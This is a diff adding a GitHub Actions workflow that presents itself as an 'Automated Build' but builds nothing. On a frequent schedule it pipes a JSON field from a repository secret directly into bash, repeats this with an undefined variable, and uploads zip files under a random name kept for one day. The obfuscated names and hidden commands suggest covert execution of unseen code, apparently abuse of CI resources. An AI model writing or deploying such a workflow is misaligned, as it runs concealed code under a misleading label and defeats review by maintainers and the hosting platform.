@@ -1,0 +1,29 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          a45: ${{ secrets.a45 }}
+        run: |
+          printf '%s' "$a45" | jq -r .jkroc955 | /bin/bash
+          printf '%s' "$rxuqc5" | jq -r .gt56 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ExlYD2sc
+          path: "*.zip"
+          retention-days: 1
